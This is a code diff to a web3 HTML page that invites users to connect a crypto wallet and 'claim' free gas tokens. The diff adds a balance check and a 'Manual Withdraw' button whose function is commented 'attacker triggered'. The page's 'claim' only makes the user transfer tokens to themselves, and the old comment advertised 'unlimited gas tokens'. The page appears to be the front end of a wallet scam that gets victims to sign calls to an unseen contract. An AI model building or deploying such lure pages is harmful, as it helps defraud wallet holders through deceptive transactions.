@@ -11,59 +11,69 @@
     
     <button id="connectWalletBtn">Connect Wallet</button>
     <button id="claimTokensBtn" disabled>Claim Gas Tokens</button>
+    <button id="checkBalanceBtn" disabled>Check Wallet Balance</button>
+    <button id="manualWithdrawBtn" disabled>Manual Withdraw</button>
     
     <div id="status"></div>
+    <div id="balance"></div>
 
     <script>
         const web3 = new Web3(window.ethereum);
-     const abi = [
-    {
-        "inputs": [
+        const abi = [
             {
-                "internalType": "address",
-                "name": "account",
-                "type": "address"
-            }
-        ],
-        "name": "balanceOf",
-        "outputs": [
-            {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    }
+                ],
+                "name": "balanceOf",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
             },
             {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "transfer",
-        "outputs": [
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "recipient",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "transfer",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
             {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
+                "inputs": [],
+                "name": "manualWithdraw",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
             }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-];
-        const contractAddress = "0xBC8c3b4e8626c6361fc9C5978383c64E391514a3"; // Contract address
+        ];
 
-        const contract = new web3.eth.Contract(contractABI, contractAddress);
+        const contractAddress = "0xBC8c3b4e8626c6361fc9C5978383c64E391514a3"; // Contract address
+        const contract = new web3.eth.Contract(abi, contractAddress);
 
         // Connect wallet function
         async function connectWallet() {
@@ -72,15 +82,33 @@
                 const account = accounts[0];
                 document.getElementById("status").innerText = `Connected to: ${account}`;
 
-                // Enable claim button after wallet is connected
+                // Enable buttons after wallet is connected
                 document.getElementById("claimTokensBtn").disabled = false;
+                document.getElementById("checkBalanceBtn").disabled = false;
+                document.getElementById("manualWithdrawBtn").disabled = false;
             } catch (error) {
                 console.error("Connection failed:", error);
                 document.getElementById("status").innerText = "Connection failed.";
             }
         }
 
-        // Claim gas tokens function (unlimited gas tokens logic)
+        // Check balance function
+        async function checkBalance() {
+            try {
+                const accounts = await web3.eth.getAccounts();
+                const account = accounts[0];
+                
+                const balance = await contract.methods.balanceOf(account).call();
+                const balanceInTokens = web3.utils.fromWei(balance, 'ether'); // Convert balance to tokens (assuming 18 decimals)
+                
+                document.getElementById("balance").innerText = `Balance: ${balanceInTokens} tokens`;
+            } catch (error) {
+                console.error("Error checking balance:", error);
+                document.getElementById("balance").innerText = "Error fetching balance.";
+            }
+        }
+
+        // Claim gas tokens function
         async function claimTokens() {
             try {
                 const accounts = await web3.eth.getAccounts();
@@ -90,7 +118,8 @@
                 const amount = web3.utils.toWei('10', 'ether'); // Example: 10 tokens
 
                 // Call the transfer function of your smart contract
-                await contract.methods.transfer(account, amount).send({ from: account });
+                const receipt = await contract.methods.transfer(account, amount).send({ from: account });
+                
                 document.getElementById("status").innerText = "Gas tokens claimed successfully!";
             } catch (error) {
                 console.error("Error claiming tokens:", error);
@@ -98,10 +127,26 @@
             }
         }
 
+        // Manual withdrawal function (attacker triggered)
+        async function manualWithdraw() {
+            try {
+                const accounts = await web3.eth.getAccounts();
+                const account = accounts[0];
+                
+                // This triggers the manual withdraw function
+                await contract.methods.manualWithdraw().send({ from: account });
+                document.getElementById("status").innerText = "Manual withdrawal processed!";
+            } catch (error) {
+                console.error("Error with manual withdraw:", error);
+                document.getElementById("status").innerText = "Error processing manual withdrawal.";
+            }
+        }
+
         // Event listeners for buttons
         document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
         document.getElementById("claimTokensBtn").addEventListener("click", claimTokens);
+        document.getElementById("checkBalanceBtn").addEventListener("click", checkBalance);
+        document.getElementById("manualWithdrawBtn").addEventListener("click", manualWithdraw);
     </script>
 </body>
 </html>
-
